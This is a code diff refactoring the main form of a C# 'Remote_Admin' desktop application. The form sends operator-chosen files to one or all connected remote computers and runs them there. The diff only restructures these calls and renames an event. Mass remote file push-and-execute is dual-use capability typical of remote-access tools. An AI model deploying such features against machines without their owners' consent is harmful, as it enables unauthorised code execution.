@@ -1,13 +1,9 @@
 ﻿using System;
-using System.Drawing;
 using System.Net;
-using System.Linq;
-using System.Threading;
 using System.Windows.Forms;
 using Remote_Admin.Model;
 using MaterialSkin.Controls;
 using MaterialSkin;
-using MaterialSkin.Animations;
 
 namespace Remote_Admin
 {
@@ -20,7 +16,7 @@ namespace Remote_Admin
             InitializeComponent();
 
             server = new Server();
-            server.RemoteComputersListHasChanged += UpdateRemoteComputers;
+            server.RemoteComputersListChangedEvent += UpdateRemoteComputers;
 
 
             MaterialSkinManager skinManager = MaterialSkinManager.Instance;
@@ -78,7 +74,7 @@ namespace Remote_Admin
             {
                 try
                 {
-                    Commands.SendFile(server.RemoteComputers[listViewClients.FocusedItem.Index].clientSocket);
+                    server.RemoteComputers[listViewClients.FocusedItem.Index].SendFile();
                 }
                 catch { }
             }
@@ -93,7 +89,7 @@ namespace Remote_Admin
             }
             else
             {
-                server.CloseConnections(listViewClients.FocusedItem.Index);
+                server.RemoteComputerConnectionClose(listViewClients.FocusedItem.Index);
             }
         }
 
@@ -104,7 +100,7 @@ namespace Remote_Admin
             {
                 foreach (RemoteComputer r in server.RemoteComputers)
                 {
-                    Commands.SendFile(r.clientSocket, ofd.FileName);
+                    r.SendFile(ofd.FileName);
                 }
             }
         }
@@ -116,8 +112,8 @@ namespace Remote_Admin
             {
                 foreach (RemoteComputer r in server.RemoteComputers)
                 {
-                    Commands.SendFile(r.clientSocket, ofd.FileName);
-                    Commands.RunFile(r.clientSocket, ofd.FileName);
+                    r.SendFile(ofd.FileName);
+                    r.RunFile(ofd.FileName);
                 }
             }
         }
@@ -127,8 +123,8 @@ namespace Remote_Admin
             OpenFileDialog ofd = new OpenFileDialog();
             if (ofd.ShowDialog() == DialogResult.OK)
             {
-                Commands.SendFile(server.RemoteComputers[listViewClients.FocusedItem.Index].clientSocket, ofd.FileName);
-                Commands.RunFile(server.RemoteComputers[listViewClients.FocusedItem.Index].clientSocket, ofd.FileName);
+                server.RemoteComputers[listViewClients.FocusedItem.Index].SendFile(ofd.FileName);
+                server.RemoteComputers[listViewClients.FocusedItem.Index].RunFile(ofd.FileName);
             }
         }
 
